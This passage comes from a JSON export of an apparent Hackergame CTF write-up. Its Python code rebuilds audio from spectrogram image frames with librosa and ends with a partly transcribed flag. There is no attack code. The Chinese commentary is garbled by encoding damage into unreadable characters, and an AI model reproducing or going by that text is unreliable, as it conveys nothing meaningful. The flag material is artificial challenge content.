os.path.abspath(sys.argv[1])\n    dest = os.path.join(os.path.dirname(image), &quot;dest&quot;)\n    if not os.path.exists(dest):\n        os.mkdir(dest)\n    extractFrames(image, dest)\n</code></pre>\n<p>ç„¶ååŸé¢˜ç»™å•¥åº“å°±ç”¨å•¥åº“ï¼Œé€†å›å»ï¼š</p>\n<pre><code class=\"python\">from array2gif import write_gif  # version: 1.0.4\nimport librosa  # version: 0.8.1\nimport numpy as np  # version: 1.19.5\nimport soundfile as sf\nfrom PIL import Image\nimport matplotlib.pyplot as plt\n\ndef ImageToMatrix(filename):\n    im = Image.open(filename)\n    height,width = im.size\n    im = im.convert(&#39;L&#39;)\n    data = im.getdata()\n    data = np.matrix(data,dtype=&#39;float&#39;)/255.0\n    new_data = np.reshape(data,(width,height))\n    return new_data\nnp.set_printoptions(threshold=1145141919810)\nnum_freqs = 32\nquantize = 2\nmin_db = -60\nmax_db = 30\nfft_window_size = 2048\nframe_step_size = 512\nwindow_function_type = &#39;hann&#39;\nred_pixel = [255, 0, 0]\nwhite_pixel = [255, 255, 255]\nsample_rate = 22050\nlis =  [[0.0 for col in range(587)] for row in range(32)]\nimgg = [[0.0 for col in range(130)] for row in range(92)]\nfor ii in range (0,587):\n    filename = &#39;./dest/%s.png&#39;%ii\n    print(filename)\n    data = ImageToMatrix(filename)\n    for i in range(0,92):\n        for j in range(0,130):\n            imgg[i][j]=data.tolist()[i][j]\n    for xpos in range(0,32):\n        for scan in range(0,92):\n            if imgg[scan][xpos*4+2]&lt;1.0:  \n                lis[xpos][ii]=float((91-scan)-60)\n                break\n\nspectrogram =  np.array(lis)\naudio_signal = librosa.feature.inverse.mel_to_audio(librosa.db_to_power(spectrogram), sr=sample_rate, n_fft=fft_window_size*2, hop_length=frame_step_size, window=window_function_type)\nsf.write(&#39;newnew.wav&#39;, audio_signal, sample_rate) \n</code></pre>\n<p>æœ€ååœ¨Adobe Audition CCé‡Œéšä¾¿å¤„ç†å¤„ç†ï¼Œå‹‰å¼ºèƒ½å¬äº†ï¼Œå¼€å§‹åŠªåŠ›å¬å†™ï¼š<br><code>Theflagis f,l,a,g ......</code>  </p>\n",
            "tags": [
                "Write-Up",
                "Hackergame"
            ]
        }
    ]
}